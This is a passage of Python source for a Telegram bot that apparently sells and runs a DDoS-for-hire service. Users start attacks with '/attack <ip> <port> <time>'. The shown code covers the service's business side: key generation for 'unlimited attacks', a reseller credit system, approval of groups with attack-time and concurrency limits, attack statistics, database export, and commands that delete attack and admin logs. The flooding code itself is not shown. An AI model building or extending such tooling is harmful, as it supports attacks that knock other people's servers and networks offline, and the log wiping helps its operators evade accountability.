    if not is_admin_or_owner(message.from_user.id):
        return

    approved = groups_col.count_documents({})
    banned = bans_col.count_documents({})
    resellers = resellers_col.count_documents({})
    admins = admins_col.count_documents({})
    active_keys = keys_col.count_documents({"redeemed_by": None, "expires": {"$gt": datetime.now().isoformat()}})
    active_plans = plans_col.count_documents({
        "$or": [{"attacks_left": -1}, {"attacks_left": {"$gt": 0}}],
        "expires": {"$gt": datetime.now().isoformat()}
    })
    total_attacks = attack_logs_col.count_documents({})
    completed_attacks = attack_logs_col.count_documents({"status": "completed"})
    known_users = known_users_col.count_documents({})
    all_groups = all_groups_col.count_documents({})

    text = f"""📊 <b>Detailed Statistics</b>

• Approved Groups: {approved}
• All Groups (Bot In): {all_groups}
• Banned Users: {banned}
• Resellers: {resellers}
• Admins: {admins}
• Known Users: {known_users}
• Active Keys: {active_keys}
• Active User Plans: {active_plans}
• Total Attacks Logged: {total_attacks}
• Completed Attacks: {completed_attacks}
• Global Max Time: {get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)}s
• Global Cooldown: {get_setting('cooldown', DEFAULT_COOLDOWN)}s
• Max Concurrent Attacks: {get_setting('max_concurrent_attacks', DEFAULT_MAX_CONCURRENT)}
• Port Protection: {'ON' if get_setting('port_protection', False) else 'OFF'}
• Feedback System: {'ON' if get_setting('feedback_system', False) else 'OFF'}
• Maintenance Mode: {'ON' if get_setting('maintenance_mode', False) else 'OFF'}
• Blocked Ports: {len(settings_col.find_one({"_id": "blocked_ports"}) or {})}
• Blocked Codes: {blocked_codes_col.count_documents({})}
"""
    bot.reply_to(message, text, parse_mode="HTML")

# ------------------ /export_data ------------------
@bot.message_handler(commands=['export_data'])
def export_data(message):
    if not is_owner(message.from_user.id):
        return
    data = {}
    for col_name in db.list_collection_names():
        data[col_name] = list(db[col_name].find({}, {'_id': 0}))
    filename = "db_export.json"
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2, default=str)
    with open(filename, 'rb') as f:
        bot.send_document(message.chat.id, f, visible_file_name=filename)
    os.remove(filename)

# ------------------ Maintenance toggle with smart extension ------------------
@bot.message_handler(commands=['maintenance'])
def toggle_maintenance(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2 or parts[1].lower() not in ['on', 'off']:
        bot.reply_to(message, "⚠️ Usage: /maintenance on/off", parse_mode="HTML")
        return
    state = parts[1].lower() == 'on'
    old_state = get_setting("maintenance_mode", False)
    update_setting("maintenance_mode", state)

    if not state and old_state:
        start_time_str = get_setting("maintenance_start_time")
        if start_time_str:
            start_time = datetime.fromisoformat(start_time_str)
            elapsed = datetime.now() - start_time
            seconds = int(elapsed.total_seconds())
            if seconds > 0:
                count = 0
                for plan in plans_col.find({"expires": {"$gt": datetime.now().isoformat()}}):
                    code = plan.get("redeemed_code")
                    if not code:
                        continue
                    key = keys_col.find_one({"_id": code})
                    if not key:
                        continue
                    original_days = key.get("duration_days")
                    created_at_str = key.get("created_at")
                    if not original_days or not created_at_str:
                        continue
                    created_at = datetime.fromisoformat(created_at_str)
                    max_expiry = created_at + timedelta(days=original_days)
                    current_expiry = datetime.fromisoformat(plan["expires"])
                    new_expiry = min(current_expiry + timedelta(seconds=seconds), max_expiry)
                    if new_expiry > current_expiry:
                        plans_col.update_one({"_id": plan["_id"]}, {"$set": {"expires": new_expiry.isoformat()}})
                        count += 1
                msg = f"🛠️ Maintenance completed! Your access has been extended by up to {seconds} seconds (capped to original key duration)."
                for user in known_users_col.find():
                    try:
                        bot.send_message(int(user["_id"]), msg)
                        time.sleep(0.5)
                    except:
                        pass
                bot.reply_to(message, f"✅ Maintenance ended. Extended {count} active plans (capped to original duration). Broadcast sent.")
            else:
                bot.reply_to(message, "✅ Maintenance ended. No extension needed (downtime < 1 sec).")
        update_setting("maintenance_start_time", None)
    elif state and not old_state:
        update_setting("maintenance_start_time", datetime.now().isoformat())
        bot.reply_to(message, "🛠️ Maintenance Mode ON. Only owner can use the bot.")
    else:
        status = "ON 🛠️" if state else "OFF ✅"
        bot.reply_to(message, f"🔧 Maintenance Mode: {status}")

# ------------------ /extend_all_users ------------------
@bot.message_handler(commands=['extend_all_users'])
def extend_all_users(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /extend_all_users &lt;seconds&gt;", parse_mode="HTML")
        return
    try:
        seconds = int(parts[1])
    except:
        bot.reply_to(message, "❌ Invalid number of seconds.")
        return
    count = 0
    for plan in plans_col.find({"expires": {"$gt": datetime.now().isoformat()}}):
        code = plan.get("redeemed_code")
        if code:
            key = keys_col.find_one({"_id": code})
            if key and key.get("duration_days") and key.get("created_at"):
                max_expiry = datetime.fromisoformat(key["created_at"]) + timedelta(days=key["duration_days"])
                new_expiry = min(datetime.fromisoformat(plan["expires"]) + timedelta(seconds=seconds), max_expiry)
                plans_col.update_one({"_id": plan["_id"]}, {"$set": {"expires": new_expiry.isoformat()}})
                count += 1
                continue
        expires = datetime.fromisoformat(plan["expires"])
        new_expires = expires + timedelta(seconds=seconds)
        plans_col.update_one({"_id": plan["_id"]}, {"$set": {"expires": new_expires.isoformat()}})
        count += 1
    bot.reply_to(message, f"✅ Extended {count} active plans by up to {seconds} seconds (capped to original duration).")

# ------------------ /deduct_all ------------------
@bot.message_handler(commands=['deduct_all'])
def deduct_all(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /deduct_all &lt;seconds&gt;", parse_mode="HTML")
        return
    try:
        seconds = int(parts[1])
    except:
        bot.reply_to(message, "❌ Invalid number of seconds.")
        return
    count = 0
    for plan in plans_col.find({"expires": {"$gt": datetime.now().isoformat()}}):
        expires = datetime.fromisoformat(plan["expires"])
        new_expires = expires - timedelta(seconds=seconds)
        if new_expires <= datetime.now():
            new_expires = datetime.now() - timedelta(seconds=1)
        plans_col.update_one({"_id": plan["_id"]}, {"$set": {"expires": new_expires.isoformat()}})
        count += 1
    bot.reply_to(message, f"✅ Deducted {seconds} seconds from {count} active plans.")

# ------------------ /deduct_time ------------------
@bot.message_handler(commands=['deduct_time'])
def deduct_time(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /deduct_time &lt;code&gt; &lt;seconds&gt;", parse_mode="HTML")
        return
    code = parts[1].upper()
    try:
        seconds = int(parts[2])
    except:
        bot.reply_to(message, "❌ Invalid number of seconds.")
        return
    key = keys_col.find_one({"_id": code})
    if not key:
        bot.reply_to(message, "❌ Code not found.")
        return
    redeemed_by = key.get("redeemed_by")
    if not redeemed_by:
        bot.reply_to(message, "❌ This code has not been redeemed yet.")
        return
    plan = plans_col.find_one({"_id": str(redeemed_by)})
    if not plan or "expires" not in plan:
        bot.reply_to(message, "❌ User plan not found.")
        return
    expires = datetime.fromisoformat(plan["expires"])
    if expires <= datetime.now():
        bot.reply_to(message, "❌ Plan already expired.")
        return
    new_expires = expires - timedelta(seconds=seconds)
    if new_expires <= datetime.now():
        new_expires = datetime.now() - timedelta(seconds=1)
    plans_col.update_one({"_id": str(redeemed_by)}, {"$set": {"expires": new_expires.isoformat()}})
    try:
        bot.send_message(redeemed_by, f"⏳ Your plan time has been reduced by {seconds} seconds. New expiry: {new_expires.strftime('%Y-%m-%d %H:%M:%S')}")
    except:
        pass
    bot.reply_to(message, f"✅ Deducted {seconds} seconds from user {redeemed_by}'s plan.")

# ------------------ Delete Logs ------------------
@bot.message_handler(commands=['deletelogs_attack'])
def deletelogs_attack(message):
    if not is_owner(message.from_user.id):
        return
    attack_logs_col.delete_many({})
    bot.reply_to(message, "✅ Attack logs deleted.")

@bot.message_handler(commands=['deletelogs_key'])
def deletelogs_key(message):
    if not is_owner(message.from_user.id):
        return
    key_logs_col.delete_many({})
    bot.reply_to(message, "✅ Key logs deleted.")

@bot.message_handler(commands=['deletelogs_all'])
def deletelogs_all(message):
    if not is_owner(message.from_user.id):
        return
    attack_logs_col.delete_many({})
    key_logs_col.delete_many({})
    admin_logs_col.delete_many({})
    bot.reply_to(message, "✅ Attack, key and admin logs deleted.")

# ------------------ Help Command ------------------
@bot.message_handler(commands=['help'])
def help_command(message):
    if not check_access(message):
        return
    text = """❓ <b>Help Menu</b>

🎯 /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt; – Start attack
📊 /status – View active attacks (live updating)
🏓 /ping – Check bot latency
🆔 /id – Get your Telegram ID
🔑 /redeem &lt;code&gt; – Redeem access key (private only)
📋 /check_my_access – View your plan details (private only)
💬 /group_info – Get group information (group only)
📢 /report &lt;message&gt; – Send feedback to owner
❓ /help – This menu"""
    if is_group(message):
        text += "\n\n⚠️ Some commands like /redeem and /check_my_access work only in private chat."
    bot.reply_to(message, text, parse_mode="HTML")

# ------------------ Group Management (admins can also use) ------------------
@bot.message_handler(commands=['approve'])
def approve_group(message):
    if not is_admin_or_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner or admin only.")
        return
    parts = message.text.split()
    if len(parts) == 5:
        try:
            gid = int(parts[1])
            max_concurrent = int(parts[2])
            max_time = int(parts[3])
            cooldown = int(parts[4])
            if max_concurrent < 1 or max_concurrent > 10:
                bot.reply_to(message, "❌ Max concurrent must be between 1 and 10.")
                return
            if max_time < 10 or max_time > 600 or cooldown < 0 or cooldown > 600:
                bot.reply_to(message, "❌ Time/cooldown must be between 10-600s.")
                return
            groups_col.update_one({"_id": str(gid)}, {"$set": {"_id": str(gid)}}, upsert=True)
            limits_col.update_one({"_id": str(gid)}, {"$set": {"max_concurrent": max_concurrent, "max_time": max_time, "cooldown": cooldown}}, upsert=True)
            log_admin_action(message.from_user.id, "approve_group", f"id={gid}, concurrent={max_concurrent}, time={max_time}, cd={cooldown}")
            bot.reply_to(message, f"✅ Group {gid} approved with:\nMax Concurrent: {max_concurrent}\nMax Time: {max_time}s\nCooldown: {cooldown}s", parse_mode="HTML")
        except:
            bot.reply_to(message, "⚠️ Usage: /approve &lt;id&gt; &lt;max_concurrent&gt; &lt;max_time&gt; &lt;cooldown&gt;", parse_mode="HTML")
        return

    if is_group(message):
        chat_id = message.chat.id
        chat_title = html.escape(message.chat.title or str(chat_id))
        if not is_approved_group(chat_id):
            groups_col.insert_one({"_id": str(chat_id)})
            limits_col.update_one({"_id": str(chat_id)}, {"$set": {
                "max_concurrent": 1,
                "max_time": get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME),
                "cooldown": get_setting("cooldown", DEFAULT_COOLDOWN)
            }}, upsert=True)
            log_admin_action(message.from_user.id, "approve_group", f"id={chat_id} (in-group)")
            bot.reply_to(message, f"✅ <b>Group Approved!</b>\n\n📛 Name: {chat_title}\n🆔 ID: {chat_id}\nLimits: 1 concurrent, {get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)}s max time, {get_setting('cooldown', DEFAULT_COOLDOWN)}s cooldown", parse_mode="HTML")
        else:
            bot.reply_to(message, "⚠️ This group is already approved!")
    else:
        bot.reply_to(message, "⚠️ Use inside a group or with: /approve &lt;id&gt; &lt;max_concurrent&gt; &lt;max_time&gt; &lt;cooldown&gt;", parse_mode="HTML")

@bot.message_handler(commands=['disapprove'])
def disapprove_group(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) == 2:
        try:
            gid = int(parts[1])
            groups_col.delete_one({"_id": str(gid)})
            limits_col.delete_one({"_id": str(gid)})
            log_admin_action(message.from_user.id, "disapprove_group", f"id={gid}")
            bot.reply_to(message, f"❌ Group {gid} Disapproved!", parse_mode="HTML")
        except:
            bot.reply_to(message, "❌ Invalid group ID!")
    elif is_group(message):
        chat_id = message.chat.id
        groups_col.delete_one({"_id": str(chat_id)})
        limits_col.delete_one({"_id": str(chat_id)})
        log_admin_action(message.from_user.id, "disapprove_group", f"id={chat_id} (in-group)")
        bot.reply_to(message, f"❌ <b>Group Disapproved!</b>\n\n🆔 ID: {chat_id}", parse_mode="HTML")
    else:
        bot.reply_to(message, "⚠️ Use inside a group or /disapprove &lt;group_id&gt;", parse_mode="HTML")

@bot.message_handler(commands=['approved_groups'])
def show_approved_groups(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    groups = list(groups_col.find())
    if not groups:
        bot.reply_to(message, "📋 No approved groups!")
        return
    text = "📋 <b>Approved Groups:</b>\n\n"
    for i, g in enumerate(groups, 1):
        gid = g["_id"]
        limits = limits_col.find_one({"_id": gid})
        limit_str = ""
        if limits:
            limit_str = f" [Conc:{limits.get('max_concurrent',1)} Time:{limits['max_time']}s CD:{limits['cooldown']}s]"
        try:
            chat = bot.get_chat(int(gid))
            name = html.escape(chat.title or str(gid))
        except:
            name = "Unknown"
        text += f"{i}. {name} ({gid}){limit_str}\n"
    bot.reply_to(message, text, parse_mode="HTML")

# ------------------ User Management (admins can ban/unban) ------------------
@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /ban &lt;user_id&gt;", parse_mode="HTML")
        return
    try:
        uid = int(parts[1])
        if uid == BOT_OWNER:
            bot.reply_to(message, "❌ Cannot ban the owner!")
            return
        bans_col.update_one({"_id": str(uid)}, {"$set": {"_id": str(uid)}}, upsert=True)
        log_admin_action(message.from_user.id, "ban_user", f"id={uid}")
        bot.reply_to(message, f"🚫 User {uid} Banned!", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ Invalid user ID!")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unban &lt;user_id&gt;", parse_mode="HTML")
        return
    try:
        uid = int(parts[1])
        bans_col.delete_one({"_id": str(uid)})
        log_admin_action(message.from_user.id, "unban_user", f"id={uid}")
        bot.reply_to(message, f"✅ User {uid} Unbanned!", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ Invalid user ID!")

@bot.message_handler(commands=['banned_list'])
def banned_list(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    banned = list(bans_col.find())
    if not banned:
        bot.reply_to(message, "📋 No banned users!")
        return
    text = "🚫 <b>Banned Users:</b>\n\n"
    for i, b in enumerate(banned, 1):
        text += f"{i}. {b['_id']}\n"
    bot.reply_to(message, text, parse_mode="HTML")

# ------------------ Reseller System (owner only) ------------------
@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /add_reseller &lt;user_id&gt;", parse_mode="HTML")
        return
    try:
        uid = int(parts[1])
        if is_reseller(uid):
            bot.reply_to(message, "⚠️ User is already a reseller.")
            return
        resellers_col.insert_one({"_id": str(uid), "credits": 0})
        log_admin_action(message.from_user.id, "add_reseller", f"id={uid}")
        bot.reply_to(message, f"✅ User {uid} added as reseller with 0 credits.", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ Invalid user ID!")

@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /remove_reseller &lt;user_id&gt;", parse_mode="HTML")
        return
    try:
        uid = int(parts[1])
        resellers_col.delete_one({"_id": str(uid)})
        keys_col.delete_many({"created_by": uid})
        log_key_event("deleted (reseller removed)", "multiple", created_by=uid, extra="Reseller removed by owner")
        log_admin_action(message.from_user.id, "remove_reseller", f"id={uid}")
        bot.reply_to(message, f"✅ User {uid} removed from resellers. Their keys have been deleted.", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ Invalid user ID!")

@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    resellers = list(resellers_col.find())
    if not resellers:
        bot.reply_to(message, "📋 No resellers.")
        return
    text = "👥 <b>Resellers:</b>\n\n"
    for r in resellers:
        text += f"• {r['_id']} – Credits: {r.get('credits', 0)}\n"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['addcredit'])
def add_credit(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /addcredit &lt;user_id&gt; &lt;amount&gt;", parse_mode="HTML")
        return
    try:
        uid = int(parts[1])
        amount = int(parts[2])
        if not is_reseller(uid):
            bot.reply_to(message, "❌ User is not a reseller.")
            return
        resellers_col.update_one({"_id": str(uid)}, {"$inc": {"credits": amount}})
        new_credits = resellers_col.find_one({"_id": str(uid)})["credits"]
        log_admin_action(message.from_user.id, "add_credit", f"reseller={uid}, amount={amount}")
        bot.reply_to(message, f"✅ Added {amount} credits to reseller {uid}. New balance: {new_credits}", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ Invalid user ID or amount!")

@bot.message_handler(commands=['removecredit'])
def remove_credit(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /removecredit &lt;user_id&gt; &lt;amount&gt;", parse_mode="HTML")
        return
    try:
        uid = int(parts[1])
        amount = int(parts[2])
        if not is_reseller(uid):
            bot.reply_to(message, "❌ User is not a reseller.")
            return
        reseller = resellers_col.find_one({"_id": str(uid)})
        current = reseller.get("credits", 0) if reseller else 0
        new = max(0, current - amount)
        resellers_col.update_one({"_id": str(uid)}, {"$set": {"credits": new}})
        log_admin_action(message.from_user.id, "remove_credit", f"reseller={uid}, amount={amount}")
        bot.reply_to(message, f"✅ Removed {min(amount, current)} credits from reseller {uid}. New balance: {new}", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ Invalid user ID or amount!")

@bot.message_handler(commands=['reseller_credits'])
def reseller_credits(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    resellers = list(resellers_col.find())
    if not resellers:
        bot.reply_to(message, "📋 No resellers.")
        return
    text = "💰 <b>Reseller Credits:</b>\n\n"
    for r in resellers:
        text += f"• {r['_id']}: {r.get('credits', 0)} credits\n"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['reseller_info'])
def reseller_info(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /reseller_info &lt;user_id or @username&gt;", parse_mode="HTML")
        return
    identifier = parts[1]
    target_id = None
    if identifier.isdigit():
        target_id = int(identifier)
    else:
        username = identifier.lstrip('@')
        for r in resellers_col.find():
            try:
                chat = bot.get_chat(int(r["_id"]))
                if chat.username and chat.username.lower() == username.lower():
                    target_id = int(r["_id"])
                    break
            except:
                pass
    if not target_id or not is_reseller(target_id):
        bot.reply_to(message, "❌ Reseller not found.")
        return
    reseller = resellers_col.find_one({"_id": str(target_id)})
    credits = reseller.get("credits", 0)
    total_keys = keys_col.count_documents({"created_by": target_id})
    active_keys = keys_col.count_documents({"created_by": target_id, "redeemed_by": None, "expires": {"$gt": datetime.now().isoformat()}})
    redeemed_keys = keys_col.count_documents({"created_by": target_id, "redeemed_by": {"$ne": None}})
    total_days = 0
    for key in keys_col.find({"created_by": target_id}):
        expires = datetime.fromisoformat(key["expires"])
        created = datetime.fromisoformat(key.get("created_at", key["expires"]))
        total_days += (expires - created).days
    try:
        chat = bot.get_chat(target_id)
        username = f"@{chat.username}" if chat.username else "No username"
        first_name = html.escape(chat.first_name or "")
    except:
        username = "Unknown"
        first_name = ""
    text = f"""👤 <b>Reseller Info</b>

🆔 ID: {target_id}
📛 Name: {first_name}
🔗 Username: {username}
💰 Credits: {credits}

📊 <b>Key Statistics:</b>
• Total Keys Generated: {total_keys}
• Active (unredeemed) Keys: {active_keys}
• Redeemed Keys: {redeemed_keys}
• Total Days Generated: {total_days} days
"""
    bot.reply_to(message, text, parse_mode="HTML")

# ------------------ Key Generation (Owner only) ------------------
@bot.message_handler(commands=['genkey'])
def genkey_owner(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /genkey &lt;max_duration&gt; &lt;cooldown&gt; &lt;days&gt;", parse_mode="HTML")
        return
    try:
        max_dur = int(parts[1])
        cd = int(parts[2])
        days = int(parts[3])
    except:
        bot.reply_to(message, "❌ All parameters must be numbers.")
        return
    code = generate_code("MASTER", 8)
    expires = datetime.now() + timedelta(days=days)
    keys_col.insert_one({
        "_id": code,
        "type": "master",
        "attacks_left": -1,
        "max_duration": max_dur,
        "cooldown": cd,
        "expires": expires.isoformat(),
        "created_by": message.from_user.id,
        "redeemed_by": None,
        "redeemed_at": None,
        "trial": False,
        "created_at": datetime.now().isoformat(),
        "duration_days": days,
        "reset_count": 0
    })
    log_key_event("generated (master unlimited)", code, created_by=message.from_user.id, extra=f"max_dur={max_dur}, days={days}")
    bot.reply_to(message, f"✅ <b>Master Key Generated (Unlimited Attacks)!</b>\n\n🔑 Code: {code}\n🎯 Attacks: Unlimited\n⏱️ Max Duration: {max_dur}s\n⏳ Cooldown: {cd}s\n📅 Valid for: {days} days\nExpires: {expires.strftime('%Y-%m-%d %H:%M:%S')}", parse_mode="HTML")

@bot.message_handler(commands=['gentrial'])
def gentrial_owner(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /gentrial &lt;hours&gt; &lt;count&gt;", parse_mode="HTML")
        return
    try:
        hours = int(parts[1])
        count = int(parts[2])
    except:
        bot.reply_to(message, "❌ Hours and count must be numbers.")
        return
    codes = []
    expires = datetime.now() + timedelta(hours=hours)
    for _ in range(count):
        code = generate_code("TRIAL", 8)
        keys_col.insert_one({
            "_id": code,
            "type": "trial",
            "attacks_left": -1,
            "max_duration": get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME),
            "cooldown": get_setting("cooldown", DEFAULT_COOLDOWN),
            "expires": expires.isoformat(),
            "created_by": message.from_user.id,
            "redeemed_by": None,
            "redeemed_at": None,
            "trial": True,
            "created_at": datetime.now().isoformat(),
            "duration_days": hours / 24.0,
            "reset_count": 0
        })
        codes.append(code)
        log_key_event("generated (trial)", code, created_by=message.from_user.id, extra=f"hours={hours}")
    code_list = "\n".join([f"{c}" for c in codes])
    bot.reply_to(message, f"✅ Generated {count} trial keys valid for {hours} hour(s):\n\n{code_list}", parse_mode="HTML")

@bot.message_handler(commands=['gentrialfor'])
def gentrial_for_reseller(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /gentrialfor &lt;reseller_id&gt; &lt;hours&gt; &lt;count&gt;", parse_mode="HTML")
        return
    try:
        reseller_id = int(parts[1])
        hours = int(parts[2])
        count = int(parts[3])
    except:
        bot.reply_to(message, "❌ Invalid parameters.")
        return
    if not is_reseller(reseller_id):
        bot.reply_to(message, "❌ User is not a reseller.")
        return
    codes = []
    expires = datetime.now() + timedelta(hours=hours)
    for _ in range(count):
        code = generate_code("TRIAL", 8)
        keys_col.insert_one({
            "_id": code,
            "type": "trial",
            "attacks_left": -1,
            "max_duration": get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME),
            "cooldown": get_setting("cooldown", DEFAULT_COOLDOWN),
            "expires": expires.isoformat(),
            "created_by": message.from_user.id,
            "created_for": str(reseller_id),
            "redeemed_by": None,
            "redeemed_at": None,
            "trial": True,
            "created_at": datetime.now().isoformat(),
            "duration_days": hours / 24.0,
            "reset_count": 0
        })
        codes.append(code)
        log_key_event("generated (trial for reseller)", code, created_by=message.from_user.id, extra=f"for={reseller_id}, hours={hours}")
    code_list = "\n".join([f"{c}" for c in codes])
    bot.reply_to(message, f"✅ Generated {count} trial keys for reseller {reseller_id} valid for {hours} hour(s):\n\n{code_list}", parse_mode="HTML")
    try:
        bot.send_message(reseller_id, f"🎁 You received {count} trial keys valid for {hours} hour(s):\n\n{code_list}", parse_mode="HTML")
    except:
        pass

@bot.message_handler(commands=['deletetrials'])
def delete_trials(message):
    if not is_owner(message.from_user.id):
        return
    result = keys_col.delete_many({"trial": True, "redeemed_by": None})
    bot.reply_to(message, f"✅ Deleted {result.deleted_count} unredeemed trial keys.")

@bot.message_handler(commands=['deletealltrials'])
def delete_all_trials(message):
    if not is_owner(message.from_user.id):
        return
    result = keys_col.delete_many({"trial": True})
    bot.reply_to(message, f"✅ Deleted all {result.deleted_count} trial keys (used & unused).")

# ================= RESELLER GEN (with credit check & 15-day limit) =================
@bot.message_handler(commands=['gen'])
def gen_reseller(message):
    user_id = message.from_user.id
    if not is_reseller(user_id) and not is_owner(user_id):
        bot.reply_to(message, "❌ Only resellers can use this command.")
        return
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /gen &lt;prefix&gt; &lt;days&gt; &lt;count&gt;", parse_mode="HTML")
        return
    prefix = parts[1]
    try:
        days = int(parts[2])
        count = int(parts[3])
    except:
        bot.reply_to(message, "❌ Days and count must be numbers.")
        return

    if not is_owner(user_id):
        if days > 15:
            bot.reply_to(message, "❌ Resellers can generate keys for a maximum of 15 days.")
            return
        total_cost = days * count
        reseller = resellers_col.find_one({"_id": str(user_id)})
        credits = reseller.get("credits", 0) if reseller else 0
        if credits < total_cost:
            bot.reply_to(message, f"❌ Insufficient credits! You have {credits} credit(s) but need {total_cost}.")
            return
        resellers_col.update_one({"_id": str(user_id)}, {"$inc": {"credits": -total_cost}})

    codes = []
    expires = datetime.now() + timedelta(days=days)
    for _ in range(count):
        code = generate_code(prefix, 8)
        keys_col.insert_one({
            "_id": code,
            "type": "reseller",
            "attacks_left": -1,
            "max_duration": get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME),
            "cooldown": get_setting("cooldown", DEFAULT_COOLDOWN),
            "expires": expires.isoformat(),
            "created_by": user_id,
            "redeemed_by": None,
            "redeemed_at": None,
            "trial": False,
            "created_at": datetime.now().isoformat(),
            "duration_days": days,
            "reset_count": 0
        })
        codes.append(code)
        log_key_event("generated (reseller unlimited)", code, created_by=user_id, extra=f"prefix={prefix}, days={days}")

    code_list = "\n".join([f"{c}" for c in codes])
    remaining_credits = ""
    if not is_owner(user_id):
        reseller = resellers_col.find_one({"_id": str(user_id)})
        remaining_credits = f"\n💳 <b>Credits Left:</b> {reseller['credits']}"

    if count == 1:
        text = f"""✨ Generated {count} Private Key

🔑 Code: {codes[0]}
⏳ Duration: {days} day{'s' if days > 1 else ''}
🎯 Usage: Unlimited attacks{remaining_credits}"""
    else:
        text = f"""✨ Generated {count} Private Keys

{code_list}

⏳ Duration: {days} day{'s' if days > 1 else ''}
🎯 Usage: Unlimited attacks per key{remaining_credits}"""
    bot.reply_to(message, text, parse_mode="HTML")

# ------------------ Redeem ------------------
@bot.message_handler(commands=['redeem'])
def redeem_code(message):
    user_id = message.from_user.id
    if is_group(message):
        bot.reply_to(message, "⚠️ Please redeem in private chat.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /redeem &lt;code&gt;", parse_mode="HTML")
        return
    code = parts[1].upper()
    if blocked_codes_col.count_documents({"_id": code}) > 0:
        bot.reply_to(message, "❌ This code has been blocked by the owner.")
        return
    key = keys_col.find_one({"_id": code})
    if not key:
        bot.reply_to(message, "❌ Invalid or expired code.")
        return
    if key.get("redeemed_by"):
        bot.reply_to(message, "❌ This code has already been redeemed.")
        return
    expires = datetime.fromisoformat(key["expires"])
    if datetime.now() > expires:
        keys_col.delete_one({"_id": code})
        bot.reply_to(message, "❌ This code has expired.")
        return
    plans_col.update_one({"_id": str(user_id)}, {"$set": {
        "attacks_left": key["attacks_left"],
        "max_duration": key["max_duration"],
        "cooldown": key["cooldown"],
        "expires": key["expires"],
        "redeemed_code": code
    }}, upsert=True)
    keys_col.update_one({"_id": code}, {"$set": {"redeemed_by": user_id, "redeemed_at": datetime.now().isoformat()}})
    log_key_event("redeemed", code, redeemed_by=user_id)
    bot.reply_to(message, f"✅ <b>Code Redeemed!</b>\n\n🎯 Attacks: {'Unlimited' if key['attacks_left'] == -1 else key['attacks_left']}\n⏱️ Max Duration: {key['max_duration']}s\n⏳ Cooldown: {key['cooldown']}s\n📅 Valid until: {expires.strftime('%Y-%m-%d %H:%M:%S')}\n\nYou can now use /attack in private chat.", parse_mode="HTML")

# ------------------ Broadcast with delay and photo support (owner only) ------------------
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ Usage: /broadcast &lt;target&gt; &lt;message&gt;\nTargets: all, private_users, resellers, authorized_groups\n\nReply to a photo and use /broadcast all &lt;caption&gt; to broadcast the photo.", parse_mode="HTML")
        return
    target = parts[1].lower()
    msg = html.escape(parts[2])
    count = 0

    photo = None
    if message.reply_to_message and message.reply_to_message.photo:
        photo = message.reply_to_message.photo[-1].file_id

    if target == "all":
        for u in known_users_col.find():
            try:
                if photo:
                    bot.send_photo(int(u["_id"]), photo, caption=msg)
                else:
                    bot.send_message(int(u["_id"]), f"📢 <b>Announcement:</b>\n\n{msg}", parse_mode="HTML")
                count += 1
                time.sleep(0.5)
            except:
                pass
        for r in resellers_col.find():
            try:
                if photo:
                    bot.send_photo(int(r["_id"]), photo, caption=msg)
                else:
                    bot.send_message(int(r["_id"]), f"📢 <b>Announcement:</b>\n\n{msg}", parse_mode="HTML")
                count += 1
                time.sleep(0.5)
            except:
                pass
        for g in all_groups_col.find():
            try:
                if photo:
                    bot.send_photo(int(g["_id"]), photo, caption=msg)
